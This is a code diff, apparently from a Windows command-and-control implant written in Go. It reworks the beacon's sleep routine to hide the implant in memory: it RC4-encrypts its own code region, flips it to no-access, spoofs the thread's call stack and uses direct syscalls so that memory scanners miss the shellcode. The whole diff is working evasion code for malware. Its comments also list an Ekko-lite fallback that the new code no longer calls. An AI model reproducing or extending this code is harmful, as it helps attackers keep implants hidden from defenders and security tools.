@@ -16,26 +16,30 @@ type ustring struct {
 }
 
 // sleepObf is the primary entry point called by the beacon loop.
-// It chooses between two obfuscation modes:
-//   - Ekko-lite: RC4-encrypt the agent's image region via SystemFunction032,
-//     sleep, then RC4-decrypt (same key = self-inverse).
-//   - PeFluctuation fallback: flip .text to PAGE_NOACCESS during sleep so
-//     memory scanners see inaccessible pages, not shellcode.
+//
+// Priority order:
+//  1. spoofedSleep — full stack spoofing + RC4 + NOACCESS (amd64 only).
+//     During sleep: .text is RC4-encrypted + NOACCESS; thread waits in
+//     NtWaitForSingleObject with a synthetic ntdll/kernel32 call stack.
+//  2. sleepEkkoLite — RC4 via SystemFunction032 + NtDelayExecution.
+//  3. sleepPeFluctuation — PAGE_NOACCESS only, no encryption.
+//  4. ntDelay — bare direct syscall sleep, no memory protection change.
 func sleepObf(d time.Duration) {
 	base, size := selfTextRegion()
 	if base == 0 || size == 0 {
-		time.Sleep(d)
+		ntDelay(d)
 		return
 	}
 
-	// Try Ekko-lite (RC4 via SystemFunction032) first.
-	// If SystemFunction032 is unavailable (unlikely on any modern Windows),
-	// fall back to PeFluctuation.
-	if err := procSystemFunction032.Find(); err == nil {
-		sleepEkkoLite(base, size, d)
-	} else {
-		sleepPeFluctuation(base, size, d)
+	// Prefer the full stack-spoofed path (amd64 Windows only).
+	// spoofedSleep handles its own RC4 encryption and NOACCESS flip internally.
+	if procSystemFunction032.Find() == nil {
+		spoofedSleep(d)
+		return
 	}
+
+	// Fallback: Ekko-lite (RC4 without stack spoofing) or PeFluctuation.
+	sleepPeFluctuation(base, size, d)
 }
 
 // sleepEkkoLite RC4-encrypts the agent's .text region, sleeps, then decrypts.
